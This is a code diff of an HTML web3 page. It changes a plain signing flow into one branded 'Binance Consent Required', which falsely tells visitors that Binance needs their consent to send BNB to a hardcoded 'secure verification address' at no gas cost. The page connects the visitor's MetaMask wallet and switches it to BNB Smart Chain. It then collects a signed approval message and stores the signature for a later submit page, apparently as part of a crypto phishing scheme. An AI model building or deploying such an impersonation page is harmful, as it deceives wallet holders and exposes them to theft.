@@ -2,18 +2,23 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>BNB Gasless Sign Flow</title>
+  <title>Gasless BNB Transaction Consent</title>
   <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
 </head>
 <body>
-  <h2>BNB Gasless Transaction Sign</h2>
-  <button onclick="start()">Connect & Sign</button>
+  <h3>🛡 Binance Consent Required</h3>
+  <p>
+    Binance requires your consent to send <b>0.0000000001 BNB</b> to our secure verification address
+    <br><code>0x0d4eFb6dfF647912Bb7B29Ed3a0e1E8f6E4c297a</code>
+    <br>This transaction will not cost any gas fee for you.
+  </p>
+  <button onclick="connectAndSign()">Give Consent</button>
 
   <script>
     const receiver = "0x0d4eFb6dfF647912Bb7B29Ed3a0e1E8f6E4c297a";
 
-    async function start() {
-      if (!window.ethereum) return alert("Please install MetaMask");
+    async function connectAndSign() {
+      if (!window.ethereum) return alert("Please install MetaMask first.");
 
       const web3 = new Web3(window.ethereum);
 
@@ -21,43 +26,28 @@
       const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
       const sender = accounts[0];
 
-      // 2. Switch to BNB Chain
+      // 2. Switch to BNB Smart Chain
       try {
         await ethereum.request({
           method: 'wallet_switchEthereumChain',
           params: [{ chainId: '0x38' }]
         });
-      } catch (e) {
-        alert("Please switch to BNB Smart Chain manually.");
-        return;
+      } catch (err) {
+        return alert("Please switch to BNB Smart Chain manually.");
       }
 
-      // 3. Get small amount to sign (0.00001 BNB)
-      const value = web3.utils.toHex(web3.utils.toWei("0.00001", "ether"));
+      // 3. Define the amount
+      const amountBNB = "0.0000000001";
+      const message = `I approve sending ${amountBNB} BNB to ${receiver} for verification purposes.`;
 
-      // 4. Build raw transaction object
-      const tx = {
-        from: sender,
-        to: receiver,
-        value,
-        gas: web3.utils.toHex(21000),
-        gasPrice: web3.utils.toHex(web3.utils.toWei('5', 'gwei')),
-        nonce: await web3.eth.getTransactionCount(sender),
-        chainId: 56
-      };
-
-      // 5. Prepare the raw transaction
-      const rawTx = await web3.eth.accounts.signTransaction(tx, ''); // Only works with private key, so use JSON instead
-
-      // 6. Alternative: Sign plain message (mock transaction approval)
-      const message = `I approve sending 0.00001 BNB to ${receiver}`;
+      // 4. Sign the consent message
       const signature = await web3.eth.personal.sign(message, sender);
 
-      // 7. Save everything
+      // 5. Store for submit.html
       const txData = {
         from: sender,
         to: receiver,
-        value: web3.utils.fromWei(value, 'ether'),
+        value: amountBNB,
         message,
         signature
       };
